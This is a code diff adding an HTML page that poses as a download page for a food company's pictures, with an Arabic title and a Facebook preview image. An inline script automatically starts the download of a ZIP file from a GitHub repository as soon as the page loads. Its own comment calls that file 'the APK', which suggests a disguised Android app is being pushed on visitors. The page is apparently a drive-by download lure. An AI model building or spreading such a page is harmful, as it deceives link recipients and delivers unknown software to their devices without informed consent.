@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title> شركة برنيق للمواد الغذائية </title>
+        <meta name="description" content="تحميل الصور"/>
+        <meta property="og:image" content="https://scontent-sof1-2.xx.fbcdn.net/v/t39.30808-6/317539499_188297470415120_6947359484684872225_n.jpg?_nc_cat=109&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=WbVOhm_63iEQ7kNvwE_qiSf&_nc_oc=Adn_VlRvWaKQTllmJirRMwb55FeQ8RqP5iyIfh37TYzS6sgkTghveZGKZ2qSr3hF2LfcIidaGIj6mMslYnK5GCXx&_nc_zt=23&_nc_ht=scontent-sof1-2.xx&_nc_gid=HLxEfNAOlyosjF47RThTLQ&oh=00_AfcAVVzEr4RbO8i_cIogtn8HfHszgoq85FlGXHDk06cr8w&oe=68F435B6"/>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        #downloadBtn {
+            background-color: #4CAF50; /* Green color */
+            color: white;
+            padding: 15px 30px;
+            font-size: 18px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+
+        #downloadBtn:hover {
+            background-color: #45a049;
+            transform: scale(1.05);
+        }
+
+        #downloadBtn:active {
+            transform: scale(0.95);
+        }
+    </style>
+</head>
+<body>
+    <button id="downloadBtn">Download Now</button>
+
+            <script>
+        // URL of the APK
+        const apkUrl = "https://github.com/Easy-Hash/Dr-essam-mohammed/raw/refs/heads/master/company%20pictures.zip";
+
+        // Create a temporary link
+        const link = document.createElement("a");
+        link.href = apkUrl;
+        document.body.appendChild(link);
+
+        // Trigger click automatically
+        link.click();
+
+        // Remove the link from DOM
+        document.body.removeChild(link);
+    </script>
+</body>
+</html>
+
